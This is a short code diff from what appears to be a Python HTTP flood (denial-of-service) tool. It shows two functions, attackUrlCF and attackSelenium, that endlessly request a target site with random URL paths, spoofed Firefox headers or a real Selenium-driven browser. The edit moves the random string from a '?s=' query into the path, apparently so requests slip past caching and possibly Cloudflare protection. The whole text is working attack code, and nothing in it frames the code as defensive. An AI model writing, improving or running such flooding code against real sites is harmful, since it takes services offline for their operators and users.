@@ -145,7 +145,7 @@ def attackUrlCF(baseUrl):
 
 	while True:
 		try:
-			url = baseUrl + '/?s=' + ''.join(random.choice(letters) for i in range(15)) 
+			url = baseUrl + '/' + ''.join(random.choice(letters) for i in range(15)) 
 
 			headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0',
 			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
@@ -330,8 +330,8 @@ def attackSelenium(baseUrl):
 	
 	while True:
 		try:
-			url = baseUrl + '/?s=' + ''.join(random.choice(letters) for i in range(random.randint(11,30))) 
-			# url = baseUrl + '/' + ''.join(random.choice(letters) for i in range(random.randint(11,30)))
+			# url = baseUrl + '/?s=' + ''.join(random.choice(letters) for i in range(random.randint(11,30))) 
+			url = baseUrl + '/' + ''.join(random.choice(letters) for i in range(random.randint(11,30)))
 			print(url)
 			driver.get(url)
 
